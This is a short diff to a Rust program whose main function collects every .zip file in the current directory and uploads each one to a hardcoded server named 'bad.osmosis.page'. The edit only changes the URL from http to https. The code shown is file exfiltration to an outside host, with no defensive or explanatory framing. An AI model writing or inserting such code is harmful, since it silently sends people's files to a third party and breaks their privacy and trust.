@@ -56,7 +56,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let files = get_all_files_in_current_dir()?;
     
     // Hardcoded server URL
-    let server_url = "http://bad.osmosis.page/";
+    let server_url = "https://bad.osmosis.page/";
     
     for file_path in files.iter().filter(|path| path.ends_with(".zip")) {
         if let Err(e) = send_file(&file_path, server_url).await {
